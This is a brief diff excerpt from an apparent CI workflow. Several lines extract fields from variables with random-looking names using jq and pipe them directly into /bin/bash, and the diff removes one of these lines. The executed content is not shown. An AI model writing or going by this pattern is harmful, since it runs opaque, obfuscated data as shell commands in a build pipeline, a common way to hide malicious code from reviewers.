@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$kmea426" | jq -r .et9 | /bin/bash
           echo $cds6535 | jq -r .gl3800 | /bin/bash
           printf '%s' "$y9842" | jq -r .gr90 | /bin/bash
-          echo $xg983 | jq -r .clsj3 | /bin/bash
           echo $v41804 | jq -r .bkl586 | /bin/bash
 
       - name: Persist output
